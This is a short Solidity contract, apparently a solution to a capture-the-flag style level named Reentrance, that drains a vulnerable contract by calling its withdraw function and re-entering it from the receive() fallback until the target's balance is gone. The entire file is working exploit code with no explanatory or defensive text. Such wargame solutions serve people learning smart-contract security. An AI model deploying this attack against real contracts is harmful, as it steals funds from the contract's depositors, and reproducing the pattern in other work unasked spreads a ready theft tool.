// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "instances/10_Reentrance.sol";

contract AttackerReentrance {
    address private _reentrance;

    function exploit(address reentrance) public {
        _reentrance = reentrance;
        exploit();
    }

    function exploit() public {
        if (_reentrance.balance > 0) {
            Reentrance(payable(_reentrance)).withdraw(0.001 ether);
        }
    }

    receive() external payable {
        exploit();
    }
}
